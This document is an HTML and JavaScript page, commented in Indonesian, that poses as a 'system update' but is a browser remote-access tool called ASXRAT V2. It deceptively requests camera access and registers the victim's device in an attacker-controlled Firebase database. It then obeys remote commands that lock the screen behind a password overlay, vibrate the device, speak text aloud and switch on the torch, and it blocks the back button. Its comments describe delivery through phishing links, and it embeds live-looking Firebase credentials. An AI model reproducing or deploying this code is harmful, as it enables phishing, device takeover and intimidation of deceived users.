<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ASXRAT V2 - SYSTEM UPDATE</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; user-select: none; }
        .box { text-align: center; padding: 25px; border: 1px solid #222; border-radius: 20px; width: 85%; background: #0a0a0a; z-index: 1; }
        .btn { background: #ff0000; color: #fff; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; margin-top: 20px; box-shadow: 0 0 10px rgba(255,0,0,0.5); }
        
        /* OVERLAY LOCK SCREEN SAKTI */
        #lock-screen { 
            display: none; position: fixed; inset: 0; background: #000; 
            z-index: 100000; flex-direction: column; justify-content: center; 
            align-items: center; text-align: center; border: 4px solid #ff0000;
        }
        #lock-msg { color: #ff0000; font-size: 24px; font-weight: bold; text-shadow: 0 0 15px red; padding: 0 20px; }
        #pw-input { width: 70%; padding: 15px; margin-top: 25px; background: #111; border: 1px solid red; color: #fff; text-align: center; border-radius: 8px; font-size: 18px; outline: none; }
        
        /* ANIMASI PATAH-PATAH (LAG SIMULATION) */
        .glitch { animation: shake 0.1s infinite; opacity: 0.8; }
        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            40% { transform: translate(1px, -1px) rotate(0deg); }
            60% { transform: translate(-1px, 1px) rotate(-1deg); }
            100% { transform: translate(1px, -2px) rotate(0deg); }
        }
    </style>
</head>
<body>

    <div class="box" id="main-ui">
        <h1 style="color:red; margin:0;">ASXRAT V2</h1>
        <p style="color:#666">Security Patch & Performance Update</p>
        <div style="font-size: 40px; margin: 20px 0;">🛡️</div>
        <button class="btn" onclick="startApp()">UPDATE & REPAIR</button>
    </div>

    <div id="lock-screen">
        <h1 id="lock-msg">PERANGKAT TERKUNCI!</h1>
        <p style="color:#555; margin-top:10px;">Masukan Password Untuk Membuka Akses</p>
        <input type="password" id="pw-input" placeholder="PASSWORD...">
        <button onclick="unlockProcess()" style="margin-top:25px; background:#ff0000; color:#fff; border:none; padding:12px 40px; border-radius:8px; font-weight:bold;">UNLOCK</button>
    </div>

<script>
    // Konfigurasi Firebase Lo Bre
    const firebaseConfig = {
      apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
      authDomain: "rat-html.firebaseapp.com",
      databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "rat-html",
      storageBucket: "rat-html.firebasestorage.app",
      messagingSenderId: "1060124583265",
      appId: "1:1060124583265:web:a117830e798cd1d60f5120"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Deteksi ID Owner dari link phising
    const params = new URLSearchParams(window.location.search);
    const idEnc = params.get('id') || "";
    const myOwnerKey = idEnc ? atob(idEnc) : "UNKNOWN"; 
    const tid = "ASXRAT-" + Math.floor(Math.random() * 9999);
    
    let correctPW = "123";
    let isLocked = false;

    // ANTI-BACK & ANTI-OUT
    history.pushState(null, null, location.href);
    window.onpopstate = function () {
        history.go(1);
    };

    async function startApp() {
        try {
            // Izin Kamera buat Senter & Akses
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('main-ui').innerHTML = "<h3>Updating System...</h3><div style='width:100%; background:#222; height:10px; border-radius:5px;'><div style='width:65%; background:red; height:100%; border-radius:5px;'></div></div>";
            
            // Register Target ke Dashboard lo
            db.ref('mario/targets/' + tid).set({
                model: navigator.userAgent.split(')')[0].split('(')[1] || "Android",
                belongsTo: myOwnerKey,
                time: Date.now()
            });

            // Listen Command dari Panel Master
            db.ref('mario/commands/' + tid).on('value', async (s) => {
                const c = s.val(); if(!c) return;

                // FITUR LOCK SAKTI
                if(c.action === "lock_screen") {
                    isLocked = true;
                    correctPW = c.pass || "123";
                    document.getElementById('lock-msg').innerText = c.text || "TERKUNCI";
                    
                    const ls = document.getElementById('lock-screen');
                    ls.style.display = 'flex';
                    ls.classList.add('glitch'); // EFEK PATAH-PATAH
                    
                    if(navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 500]);
                    document.documentElement.requestFullscreen().catch(()=>{});
                }

                if(c.action === "unlock") {
                    isLocked = false;
                    document.getElementById('lock-screen').style.display = 'none';
                    document.getElementById('lock-screen').classList.remove('glitch');
                }
                
                // FITUR VIBRATE
                if(c.action === "vibrate") navigator.vibrate([500, 100, 500]);

                // FITUR TTS (SUARA)
                if(c.action === "speak_text") {
                    let u = new SpeechSynthesisUtterance(c.text);
                    u.lang = 'id-ID'; u.pitch = 0.5; u.rate = 0.9;
                    window.speechSynthesis.speak(u);
                }

                // FITUR SENTER
                if(c.action === "torch_on") {
                    const track = stream.getVideoTracks()[0];
                    track.applyConstraints({advanced: [{torch: true}]}).catch(()=>{});
                }
            });
        } catch (e) { alert("Butuh izin sistem untuk update!"); }
    }

    function unlockProcess() {
        const input = document.getElementById('pw-input').value;
        if(input === correctPW) {
            isLocked = false;
            document.getElementById('lock-screen').style.display = 'none';
            document.getElementById('lock-screen').classList.remove('glitch');
            if(document.exitFullscreen) document.exitFullscreen().catch(()=>{});
        } else {
            navigator.vibrate(1000);
            alert("PASSWORD SALAH!");
        }
    }
</script>
</body>
</html>
